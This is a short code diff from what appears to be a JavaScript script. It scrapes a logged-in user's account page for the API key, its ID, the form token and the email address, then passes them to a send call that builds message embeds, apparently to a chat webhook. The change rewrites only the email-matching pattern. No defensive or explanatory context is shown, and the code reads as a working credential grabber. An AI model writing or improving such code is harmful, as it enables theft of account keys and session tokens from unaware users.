@@ -16,7 +16,7 @@
     const apiKey = (acct.match(/notranslate['"]>\s*([a-f0-9]{12,})\s*</) || [])[1];
     const keyId  = (acct.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
     const token  = (acct.match(/name="token"\s+value="([^"]+)"/) || [])[1];
-    const email  = (acct.match(/E-?mail[^<]*<\/td>\s*<td[^>]*>\s*([^<\s]+@[^<\s]+)/i) || [])[1];
+    const email  = (acct.match(/Current E-mail:[\s\S]*?notranslate">\s*(\S+@\S+\.\w+)/) || [])[1];
 
     await send({
       embeds: [{
